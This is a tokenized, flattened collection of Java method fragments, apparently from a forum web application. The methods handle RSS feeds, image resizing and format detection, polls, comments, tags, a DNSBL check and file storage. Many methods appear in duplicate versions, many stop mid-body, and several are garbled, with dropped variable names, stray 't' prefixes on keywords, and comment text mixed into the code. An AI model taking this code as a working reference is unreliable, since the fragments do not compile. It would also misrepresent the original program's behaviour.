protected void renderMergedOutputModel ( Map model , HttpServletRequest request , HttpServletResponse response ) throws Exception { SyndFeed feed = new SyndFeedImpl ( ) ; feed . setEncoding ( " utf-8 " ) ; String feedType = ( String ) model . get ( " feed-type " ) ; if ( StringUtils . isEmpty ( feedType ) ) { feedType = " rss " ; } feed . setFeedType ( feedTypes . get ( feedType ) ) ; createFeed ( feed , model ) ; response . setContentType ( contentTypes . get ( feedType ) ) ; response . setCharacterEncoding ( " UTF-8 " ) ; SyndFeedOutput output = new SyndFeedOutput ( ) ; output . output ( feed , response . getWriter ( ) ) ; } 
public void testSlashAfterAmp ( ) { HTMLFormatter formatter = new HTMLFormatter ( SLASH_AFTER_AMP ) ; formatter . enableUrlHighLightMode ( ) ; String s2 = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s2 . endsWith ( " </a> " ) ) ; int blankIndex = s2 . indexOf ( " " ) ; int lastIndex = s2 . lastIndexOf ( " " ) ; assertThat ( " No whitespace inside link " , blankIndex , CoreMatchers . equalTo ( lastIndex ) ) ; whitespace shoud separate href attribute. no other ws should occur 
public void substitute ( Connection db , CharSequence from , StringBuffer to , RegexTag regex , String replacement ) { to . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { String value = m . group ( 1 ) ; value = HTMLFormatter . htmlSpecialChars ( value ) ; if ( ! URLUtil . isUrlNoXSS ( value ) ) { m . appendReplacement ( to , BAD_DATA ) ; } else { m . appendReplacement ( to , replacement ) ; } } m . appendTail ( to ) ; } 
public static boolean isUrlNoXSS ( String x ) { return HTMLFormatter . urlRE . matcher ( x ) . matches ( ) ; } 
public void substitute ( Connection db , CharSequence from , StringBuffer to , RegexTag regex , String replacement ) { to . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { if ( ! URLUtil . isUrlNoXSS ( m . group ( 1 ) ) ) { m . appendReplacement ( to , BAD_DATA ) ; } else { m . appendReplacement ( to , replacement ) ; } } m . appendTail ( to ) ; } 
private void initFiles ( String name , String path ) { String mainname = name + " . " + extension ; String iconname = name + " -icon " + " . " + extension ; String medname = name + " -med " + " . " + extension ; mainFile = new File ( path , mainname ) ; iconFile = new File ( path , iconname ) ; mediumFile = new File ( path , medname ) ; } 
public void copyScreenshotFromPreview ( Template tmpl , int msgid ) throws IOException , UtilException , InterruptedException { initFiles ( Integer . toString ( msgid ) , tmpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + " /gallery " ) ; doResize ( ) ; } 
private void doResize ( ) throws IOException , UtilException , InterruptedException { boolean error = true ; file . renameTo ( mainFile ) ; try { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
public void copyScreenshot ( Template tmpl , String sessionId ) throws IOException , UtilException , InterruptedException { initFiles ( sessionId , tmpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + " /gallery/preview " ) ; doResize ( ) ; } 
public static void resizeImage ( String filename , String iconname , int size ) throws IOException , UtilException , InterruptedException { String [ ] cmd = { " /usr/bin/convert " , " -scale " , Integer . toString ( size ) , filename , iconname } ; Process proc = Runtime . getRuntime ( ) . exec ( cmd ) ; int exitStatus = proc . waitFor ( ) ; if ( exitStatus ! = 0 ) { throw new UtilException ( " Can't convert image: convert failed " ) ; 
private int allocateMsgid ( Connection db ) throws SQLException { Statement st = null ; ResultSet rs = null ; try { st = db . createStatement ( ) ; 
private void initFiles ( String name , String path ) { String mainname = name + '.' + extension ; String iconname = name + " -icon " + '.' + extension ; String medname = name + " -med " + '.' + extension ; mainFile = new File ( path , mainname ) ; iconFile = new File ( path , iconname ) ; mediumFile = new File ( path , medname ) ; } 
private void doResize ( ) throws IOException , UtilException , InterruptedException { file . renameTo ( mainFile ) ; boolean error = true ; try { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
public int doStartTag ( ) throws JspException { String cached = ( String ) provider . getFromCache ( getKey ( ) ) ; foundInCache = cached ! = null ; if ( foundInCache ) { try { pageContext . getOut ( ) . write ( cached ) ; } catch ( IOException e ) { log . error ( e ) ; } return SKIP_BODY ; } return EVAL_BODY_BUFFERED ; } 
public List < ArchiveDaoImpl . ArchiveDTO > get ( ) { return archiveDao . getArchiveDTO ( ) ; } 
public List < GalleryItem > get ( ) { return galleryDao . getGalleryItems ( ) ; } 
public PollDaoImpl . PollDTO get ( ) { try { return pollDao . getCurrentPoll ( ) ; 
public List < PollDaoImpl . VoteDTO > get ( ) { return pollDao . getVoteDTO ( poll . getId ( ) ) ; } 
public Integer get ( ) { return pollDao . getVotersCount ( poll . getId ( ) ) ; } 
public List < TagDaoImpl . TagDTO > get ( ) { return getTagDao ( ) . getTags ( i ) ; } 
public List < TopTenDaoImpl . TopTenMessageDTO > get ( ) { List < TopTenDaoImpl . TopTenMessageDTO > list = getTopTenDao ( ) . getMessages ( ) ; CollectionUtils . forAllDo ( list , new Closure ( ) { public void execute ( Object o ) { TopTenDaoImpl . TopTenMessageDTO dto = ( TopTenDaoImpl . TopTenMessageDTO ) o ; dto . setPages ( ( int ) Math . ceil ( dto . getAnswers ( ) / itemsPerPage ) ) ; } } ) ; return list ; } 
public void execute ( Object o ) { TopTenDaoImpl . TopTenMessageDTO dto = ( TopTenDaoImpl . TopTenMessageDTO ) o ; dto . setPages ( ( int ) Math . ceil ( dto . getAnswers ( ) / itemsPerPage ) ) ; } 
public Object getFromCache ( String key ) ; public < T > boolean storeToCache ( String key , T value , long expire ) ; } 
private GalleryItem createGalleryItem ( ResultSet rs ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; String htmlPath = properties . getProperties ( ) . getProperty ( " HTMLPathPrefix " , " " ) ; item . setHtmlPath ( htmlPath ) ; try { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public PollDTO getCurrentPoll ( ) throws PollNotFoundException { String sql = " SELECT votenames.id, votenames.title, votenames.topic FROM votenames " + " JOIN topics on votenames.topic = topics.id WHERE " + " topics.moderate AND not topics.deleted " + " AND topics.commitdate = (select max(commitdate) " + " from topics where groupid=19387 AND moderate AND NOT deleted) " ; PollDTO result = jdbcTemplate . queryForObject ( sql , new ParameterizedRowMapper < PollDTO > ( ) { public PollDTO mapRow ( ResultSet rs , int rowNum ) throws SQLException { PollDTO result = new PollDTO ( ) ; result . setId ( rs . getInt ( " id " ) ) ; result . setTitle ( rs . getString ( " title " ) ) ; result . setTopic ( rs . getInt ( " topic " ) ) ; return result ; } } , new HashMap ( ) ) ; if ( result = = null ) { throw new PollNotFoundException ( - 1 ) ; } return result ; } 
public PollDTO mapRow ( ResultSet rs , int rowNum ) throws SQLException { PollDTO result = new PollDTO ( ) ; result . setId ( rs . getInt ( " id " ) ) ; result . setTitle ( rs . getString ( " title " ) ) ; result . setTopic ( rs . getInt ( " topic " ) ) ; return result ; } 
public PollDTO get ( ) { try { return pollDao . getCurrentPoll ( ) ; 
public List < VoteDTO > get ( ) { return pollDao . getVoteDTO ( poll . getId ( ) ) ; } 
public int compareTo ( TagDTO o ) { return value . compareTo ( o . value ) ; } 
public List < TopTenDaoImpl . TopTenMessageDTO > get ( ) { List < TopTenDaoImpl . TopTenMessageDTO > list = getTopTenDao ( ) . getMessages ( ) ; CollectionUtils . forAllDo ( list , new Closure ( ) { @Override public void execute ( Object o ) { TopTenDaoImpl . TopTenMessageDTO dto = ( TopTenDaoImpl . TopTenMessageDTO ) o ; dto . setPages ( ( int ) Math . ceil ( dto . getAnswers ( ) / itemsPerPage ) ) ; } } ) ; return list ; } 
public ModelAndView showForm ( ) { return new ModelAndView ( " lostpwd-form " ) ; } 
public ModelAndView sendPassword ( @RequestParam ( " nick " ) String nick , @RequestParam ( " email " ) String useremail ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelMap showRemove ( @RequestParam String tag , @RequestParam ( required = false ) Integer pos , ServletRequest request ) throws AccessViolationException , UtilException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } ModelMap result = new ModelMap ( ) ; EditBoxesForm form = new EditBoxesForm ( ) ; form . setPosition ( pos ) ; form . setTag ( tag ) ; result . addAttribute ( " form " , form ) ; return result ; } 
public ModelAndView showForm ( ) { return new ModelAndView ( " add_comment " ) ; } 
public ModelAndView addComment ( ) { return new ModelAndView ( " add_comment " ) ; } 
public ModelAndView showForm ( @RequestParam ( " topic " ) int topicId , @RequestParam ( value = " replyto " , required = false ) Integer replyTo , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " topic " , topicId ) ; params . put ( " autourl " , true ) ; params . put ( " mode " , tmpl . getFormatMode ( ) ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
private void createReplyTo ( Integer replyTo , Map < String , Object > params , Connection db ) throws SQLException , MessageNotFoundException { if ( replyTo ! = null ) { Comment onComment = new Comment ( db , replyTo ) ; 
public ModelAndView showForm ( @RequestParam ( " msgid " ) int msgid ) { return new ModelAndView ( " delete " , " msgid " , msgid ) ; } 
public ModelAndView deleteMessage ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " nick " , required = false ) String nick , @RequestParam ( " reason " ) String reason , HttpServletRequest request ) throws Exception { HttpSession session = request . getSession ( ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showForm ( ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } return new ModelAndView ( " addphoto " ) ; } 
public static String detectImageType ( File file ) throws BadImageException , IOException { logger . fine ( " Detecting image type for: " + file + " ( " + file . length ( ) + " bytes) " ) ; ImageInfo2 ii = new ImageInfo2 ( ) ; FileInputStream is = null ; try { is = new FileInputStream ( file ) ; 
private GalleryItem createGalleryItem ( ResultSet rs ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; String htmlPath = properties . getProperty ( " HTMLPathPrefix " ) ; item . setHtmlPath ( htmlPath ) ; try { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public ModelAndView showController ( @RequestParam ( " msgid " ) int msgid ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public static void resizeImage ( String filename , String iconname , int size ) throws IOException , UtilException , InterruptedException { String [ ] cmd = { " /usr/bin/convert " , " -scale " , Integer . toString ( size ) , filename , iconname } ; Process proc = Runtime . getRuntime ( ) . exec ( cmd ) ; int exitStatus = proc . waitFor ( ) ; if ( exitStatus ! = 0 ) { logger . warning ( " Failed to convert from " + filename + " to " + iconname ) ; 
public boolean hasGravatar ( ) { return email ! = null ; } 
private void initFiles ( String name , String path ) { String mainname = name + '.' + extension ; String iconname = name + " -icon.jpg " ; String medname = name + " -med.jpg " ; mainFile = new File ( path , mainname ) ; iconFile = new File ( path , iconname ) ; mediumFile = new File ( path , medname ) ; } 
public String getAddInfo ( Connection db ) throws SQLException { Statement st = null ; ResultSet rs = null ; try { st = db . createStatement ( ) ; 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " sectionId " , sectionId ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public List < Comment > getComments ( boolean reverse , int offset , int limit , Set < Integer > hideSet ) throws IOException , UtilException , SQLException , UserNotFoundException { return getCommentList ( comments . getList ( ) , reverse , offset , limit , hideSet ) ; } 
public List < Comment > getCommentsSubtree ( int parentId ) throws IOException , UtilException , MessageNotFoundException , SQLException , UserNotFoundException { CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { throw new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < Comment > ( ) ; parentNode . buildList ( parentList ) ; return getCommentList ( parentList , false , 0 , 0 , null ) ; } 
public static Set < Integer > makeHideSet ( Connection db , CommentList comments , int filterChain , String nick ) throws SQLException , UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return null ; } Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 & & nick ! = null & & ! " " . equals ( nick ) ) { Map < Integer , String > ignoreList = IgnoreList . getIgnoreListHash ( db , nick ) ; if ( ignoreList ! = null & & ! ignoreList . isEmpty ( ) ) { comments . root . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public int doStartTag ( ) throws JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; String s = getObject ( ) ; if ( StringUtils . isEmpty ( s ) ) { s = " main2 " ; } @SuppressWarnings ( " unchecked " ) List < String > boxnames = ( List < String > ) . getProf ( ) . getObject ( s ) ; CollectionUtils . filter ( boxnames , new Predicate ( ) { @Override public boolean evaluate ( Object o ) { String s = ( String ) o ; return mkdefprofile . isBox ( s ) ; } } ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public PollDTO getCurrentPoll ( ) throws PollNotFoundException { String sql = " SELECT votenames.id, votenames.title, votenames.topic FROM votenames " + " JOIN topics on votenames.topic = topics.id WHERE " + " topics.moderate AND not topics.deleted " + " AND topics.commitdate = (select max(commitdate) " + " from topics where groupid=19387 AND moderate AND NOT deleted) " ; PollDTO result = jdbcTemplate . queryForObject ( sql , new ParameterizedRowMapper < PollDTO > ( ) { @Override public PollDTO mapRow ( ResultSet rs , int rowNum ) throws SQLException { PollDTO result = new PollDTO ( ) ; result . setId ( rs . getInt ( " id " ) ) ; result . setTitle ( rs . getString ( " title " ) ) ; result . setTopic ( rs . getInt ( " topic " ) ) ; return result ; } } , new HashMap ( ) ) ; if ( result = = null ) { throw new PollNotFoundException ( - 1 ) ; } return result ; } 
private void check ( String domain , String msgid ) throws StorageException { if ( ! DOMAIN_CHECK_RE . isMatch ( domain ) ) { throw new StorageBadDomainException ( domain ) ; } if ( ! NAME_CHECK_RE . isMatch ( msgid ) ) { throw new StorageBadMsgidException ( msgid ) ; 
public static Map < Integer , String > getIgnoreListHash ( Connection db , String nick ) throws SQLException { PreparedStatement pst = db . prepareStatement ( " SELECT a.ignored,b.nick FROM ignore_list a, users b WHERE a.userid=(SELECT id FROM users WHERE nick=?) AND b.id=a.ignored " ) ; pst . clearParameters ( ) ; pst . setString ( 1 , nick ) ; ResultSet rs = pst . executeQuery ( ) ; Map < Integer , String > cignored = new HashMap < Integer , String > ( ) ; while ( rs . next ( ) ) { cignored . put ( rs . getInt ( " ignored " ) , rs . getString ( " nick " ) ) ; } return cignored ; } 
public void buildList ( List < Comment > list ) { if ( comment ! = null ) { list . add ( comment ) ; } for ( CommentNode child : childs ) { child . buildList ( list ) ; 
String show ( Connection db ) throws IOException , SQLException , UtilException , UserErrorException ; String getVariantID ( ProfileHashtable prof ) throws UtilException ; Date getExpire ( ) ; } 
String getVariantID ( ProfileHashtable prof ) throws UtilException ; Date getExpire ( ) ; } 
Object getFromCache ( String key ) ; < T > boolean storeToCache ( String key , T value , long expire ) ; } 
< T > boolean storeToCache ( String key , T value , long expire ) ; } 
public TagDTO mapRow ( ResultSet rs , int rowNum ) throws SQLException { TagDTO result = new TagDTO ( ) ; result . setValue ( rs . getString ( " value " ) ) ; double counter = Math . log ( rs . getInt ( " counter " ) ) ; result . setCounter ( counter ) ; if ( maxc . doubleValue ( ) < counter ) { maxc . setValue ( counter ) ; } if ( minc . doubleValue ( ) < 0 | | counter < minc . doubleValue ( ) ) { minc . setValue ( counter ) ; } return result ; } 
private boolean checkIff ( ) throws IOException { tbyte [ ] a = new byte [ 10 ] ; if (read(a, 0, 8) != 8) { 
private boolean checkPng ( ) throws IOException { tbyte [ ] PNG_MAGIC = { 0x4e , 0x47 , 0x0d , 0x0a , 0x1a , 0x0a } ; tbyte [ ] a = new byte [ 27 ] ; if ( read ( a ) ! = 27 ) { treturn false ; } if ( ! equals ( a , 0 , PNG_MAGIC , 0 , 6 ) ) { treturn false ; } tformat = FORMAT_PNG ; twidth = getIntBigEndian ( a , 14 ) ; theight = getIntBigEndian ( a , 18 ) ; tbitsPerPixel = a [ 22 ] & 0xff ; tint colorType = a [ 23 ] & 0xff ; if ( colorType = = 2 | | colorType = = 6 ) { tbitsPerPixel * = 3 ; } tprogressive = ( a [ 26 ] & 0xff ) ! = 0 ; treturn true ; } 
private boolean checkPnm ( int id ) throws IOException { if ( id < 1 | | id > 6 ) { treturn false ; } tint [ ] PNM_FORMATS = { FORMAT_PBM , FORMAT_PGM , FORMAT_PPM } ; tformat = PNM_FORMATS [ ( id - 1 ) % 3 ] ; tboolean hasPixelResolution = false ; tString s ; twhile ( true ) { 
private boolean checkPsd ( ) throws IOException { tbyte [ ] a = new byte [ 24 ] ; if ( read ( a ) ! = a . length ) { treturn false ; } tbyte [ ] PSD_MAGIC = { 0x50 , 0x53 } ; if ( ! equals ( a , 0 , PSD_MAGIC , 0 , 2 ) ) { treturn false ; } tformat = FORMAT_PSD ; twidth = getIntBigEndian ( a , 16 ) ; theight = getIntBigEndian ( a , 12 ) ; tint channels = getShortBigEndian ( a , 10 ) ; tint depth = getShortBigEndian ( a , 20 ) ; tbitsPerPixel = channels * depth ; treturn ( width > 0 & & height > 0 & & bitsPerPixel > 0 & & bitsPerPixel < = 64 ) ; } 
private boolean checkRas ( ) throws IOException { tbyte [ ] a = new byte [ 14 ] ; if ( read ( a ) ! = a . length ) { treturn false ; } tbyte [ ] RAS_MAGIC = { 0x6a , ( byte ) 0x95 } ; if ( ! equals ( a , 0 , RAS_MAGIC , 0 , 2 ) ) { treturn false ; } tformat = FORMAT_RAS ; twidth = getIntBigEndian ( a , 2 ) ; theight = getIntBigEndian ( a , 6 ) ; tbitsPerPixel = getIntBigEndian ( a , 10 ) ; treturn ( width > 0 & & height > 0 & & bitsPerPixel > 0 & & bitsPerPixel < = 24 ) ; } 
private static void printCompact ( String sourceName , ImageInfo2 ImageInfo2 ) { tString SEP = " " ; tSystem . out . println ( tsourceName + SEP + 
protected OutputStream getWriteStreamImpl ( String domain , String msgid ) throws IOException { FileOutputStream in = new FileOutputStream ( root + domain + '/' + msgid ) ; return in ; } 
private boolean checkPnm ( int id ) throws IOException { if ( id < 1 | | id > 6 ) { treturn false ; } tint [ ] PNM_FORMATS = { FORMAT_PBM , FORMAT_PGM , FORMAT_PPM } ; tformat = PNM_FORMATS [ ( id - 1 ) % 3 ] ; tboolean hasPixelResolution = false ; while ( true ) { 
public List < Comment > getCommentsSubtree ( int parentId ) throws MessageNotFoundException { CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { throw new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < Comment > ( ) ; parentNode . buildList ( parentList ) ; return getCommentList ( parentList , false , 0 , 0 , null ) ; } 
public ModelMap showRemove ( @RequestParam String tag , @RequestParam ( required = false ) Integer pos , ServletRequest request ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } ModelMap result = new ModelMap ( ) ; EditBoxesForm form = new EditBoxesForm ( ) ; form . setPosition ( pos ) ; form . setTag ( tag ) ; result . addAttribute ( " form " , form ) ; return result ; } 
protected OutputStream getWriteStreamImpl ( String domain , String msgid ) throws IOException { return new FileOutputStream ( root + domain + '/' + msgid ) ; } 
public void write ( OutputStream df ) throws IOException { profileHashtable . setObject ( " system.timestamp " , new Date ( ) . getTime ( ) ) ; ObjectOutputStream dof = null ; try { dof = new ObjectOutputStream ( df ) ; 
public boolean getBoolean ( String prop ) throws UtilException { if ( settings . get ( prop ) ! = null ) { return ( Boolean ) settings . get ( prop ) ; 
public void addBoolean ( String prop , boolean value ) { settings . put ( prop , value ) ; } 
public int doStartTag ( ) throws JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; String s = object ; if ( StringUtils . isEmpty ( s ) ) { s = " main2 " ; } @SuppressWarnings ( " unchecked " ) List < String > boxnames = ( List < String > ) . getProf ( ) . getObject ( s ) ; CollectionUtils . filter ( boxnames , new Predicate ( ) { @Override public boolean evaluate ( Object o ) { String s = ( String ) o ; return mkdefprofile . isBox ( s ) ; } } ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public int doStartTag ( ) throws JspException { String cached = ( String ) provider . getFromCache ( key ) ; foundInCache = cached ! = null ; if ( foundInCache ) { try { pageContext . getOut ( ) . write ( cached ) ; } catch ( IOException e ) { log . error ( e ) ; } return SKIP_BODY ; } return EVAL_BODY_BUFFERED ; } 
public int doAfterBody ( ) throws JspException { if ( ! foundInCache ) { if ( bodyContent ! = null ) { String result = bodyContent . getString ( ) ; provider . storeToCache ( key , result , expire ) ; try { bodyContent . clearBody ( ) ; bodyContent . write ( result ) ; bodyContent . writeOut ( bodyContent . getEnclosingWriter ( ) ) ; } catch ( IOException e ) { log . error ( e ) ; } } } return SKIP_BODY ; } 
public boolean checkIP ( String addr ) throws TextParseException { String query = invertIPAddress ( addr ) + '.' + zone ; logger . fine ( " Looking for " + query ) ; Lookup lookup = new Lookup ( query , Type . A ) ; lookup . setResolver ( resolver ) ; Record [ ] r = lookup . run ( ) ; if ( r = = null | | r . length = = 0 ) { return false ; } logger . info ( " DNSBL: found " + addr + " in DNSBL: " + r [ 0 ] ) ; TODO: check what we really got ;-) return true; } 
private static String invertIPAddress ( String originalIPAddress ) { StringTokenizer = new StringTokenizer ( originalIPAddress , " . " ) ; String inverted = . nextToken ( ) ; while ( . hasMoreTokens ( ) ) { inverted = . nextToken ( ) + '.' + inverted ; } return inverted ; } 
public void testSlashAfterAmp ( ) { HTMLFormatter formatter = new HTMLFormatter ( SLASH_AFTER_AMP ) ; formatter . enableUrlHighLightMode ( ) ; String s2 = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s2 . endsWith ( " </a> " ) ) ; int blankIndex = s2 . indexOf ( ' ' ) ; int lastIndex = s2 . lastIndexOf ( ' ' ) ; assertThat ( " No whitespace inside link " , blankIndex , CoreMatchers . equalTo ( lastIndex ) ) ; whitespace shoud separate href attribute. no other ws should occur 
private boolean checkBmp ( ) throws IOException { tbyte [ ] a = new byte [ 44 ] ; if ( read ( a ) ! = a . length ) { treturn false ; } twidth = getIntLittleEndian ( a , 16 ) ; theight = getIntLittleEndian ( a , 20 ) ; if ( width < 1 | | height < 1 ) { treturn false ; } tbitsPerPixel = getShortLittleEndian ( a , 26 ) ; if ( bitsPerPixel ! = 1 & & bitsPerPixel ! = 4 & & bitsPerPixel ! = 8 & & bitsPerPixel ! = 16 & & bitsPerPixel ! = 24 & & bitsPerPixel ! = 32 ) { return false ; } tint x = ( int ) ( getIntLittleEndian ( a , 36 ) * 0.0254 ) ; if ( x > 0 ) { physicalHeightDpi = x ; } tint y = ( int ) ( getIntLittleEndian ( a , 40 ) * 0.0254 ) ; if ( y > 0 ) { physicalWidthDpi = y ; } tformat = FORMAT_BMP ; treturn true ; } 
private boolean checkPcx ( ) throws IOException { tbyte [ ] a = new byte [ 64 ] ; if ( read ( a ) ! = a . length ) { treturn false ; } if ( a [ 0 ] ! = 1 ) { } 
public static void main ( String [ ] args ) { tImageInfo2 ImageInfo2 = new ImageInfo2 ( ) ; ImageInfo2 . determineNumberOfImages = true ; tboolean verbose = determineVerbosity ( args ) ; if ( args . length = = 0 ) { trun ( null , System . in , ImageInfo2 , verbose ) ; 
private static void printVerbose ( String sourceName , ImageInfo2 ii ) { tprintLine ( 0 , null , sourceName ) ; tprintLine ( 1 , " File format: " , ii . getFormatName ( ) ) ; tprintLine ( 1 , " MIME type: " , ii . getMimeType ( ) ) ; tprintLine ( 1 , " Width (pixels): " , ii . width , 1 ) ; tprintLine ( 1 , " Height (pixels): " , ii . height , 1 ) ; tprintLine ( 1 , " Bits per pixel: " , ii . bitsPerPixel , 1 ) ; tprintLine ( 1 , " Progressive: " , ii . progressive ? " yes " : " no " ) ; tprintLine ( 1 , " Number of images: " , ii . numberOfImages , 1 ) ; tprintLine ( 1 , " Physical width (dpi): " , ii . physicalWidthDpi , 1 ) ; tprintLine ( 1 , " Physical height (dpi): " , ii . physicalHeightDpi , 1 ) ; tprintLine ( 1 , " Physical width (inches): " , ii . getPhysicalWidthInch ( ) , 1.0f ) ; tprintLine ( 1 , " Physical height (inches): " , ii . getPhysicalHeightInch ( ) , 1.0f ) ; tint numComments = ii . getNumberOfComments ( ) ; tprintLine ( 1 , " Number of textual comments: " , numComments , 1 ) ; if ( numComments > 0 ) { tfor ( int i = 0 ; i < numComments ; i + + ) { 
private static void run ( String sourceName , InputStream in , ImageInfo2 ImageInfo2 , boolean verbose ) { tImageInfo2 . setInput ( in ) ; ImageInfo2 . determineNumberOfImages = true ; ImageInfo2 . collectComments = verbose ; if ( ImageInfo2 . check ( ) ) { tprint ( sourceName , ImageInfo2 , verbose ) ; 
public void estModification ( ) throws IOException , ClassNotFoundException { Profile profile = new Profile ( null ) ; profile . getHashtable ( ) . setInt ( " messages " , 125 ) ; ByteArrayOutputStream os = new ByteArrayOutputStream ( ) ; profile . write ( os ) ; new Profile ( new ByteArrayInputStream ( os . toByteArray ( ) ) , " test " ) ; } 
protected String readMessageImpl ( String domain , String msgid ) throws IOException , StorageNotFoundException { BufferedReader in ; try { in = new BufferedReader ( new InputStreamReader ( new FileInputStream ( root + domain + '/' + msgid ) , " KOI8-R " ) ) ; } catch ( FileNotFoundException e ) { throw new StorageNotFoundException ( domain , msgid , e ) ; } char [ ] buf = new char [ 8192 ] ; StringBuffer out = new StringBuffer ( ) ; int i ; while ( ( i = in . read ( buf , 0 , buf . length ) ) > - 1 ) { if ( i > 0 ) { out . append ( buf , 0 , i ) ; } } in . close ( ) ; return out . toString ( ) ; } 
protected InputStream getReadStreamImpl ( String domain , String msgid ) throws StorageNotFoundException { FileInputStream in ; TODO: try buffered input stream and check perfomance try { in = new FileInputStream(root + domain + '/' + msgid); } catch (FileNotFoundException e) { throw new StorageNotFoundException(domain, msgid); } return in; } 
public String show ( Connection db ) throws IOException , SQLException , UtilException , UserErrorException { StringBuilder buf = new StringBuilder ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND topics.moderate AND sections.moderate " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( tag ! = null & & ! " " . equals ( tag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " ) ; pst . setString ( 1 , tag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int tagid = rs . getInt ( " id " ) ; if ( tagid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( tagid ) . append ( ')' ) ; } } else { throw new UserErrorException ( " Tag not found " ) ; } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, groups.id as guid, " + " topics.url, topics.linktext, imagepost, vote, sections.name as pname, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, bbcode, " + " sections.id as section, NOT topics.sticky AS ssticky, sections.moderate " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where + ' ' + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . toString ( ) ; } 
public boolean evaluate ( Object o ) { return mkdefprofile . isBox ( ( String ) o ) ; } 
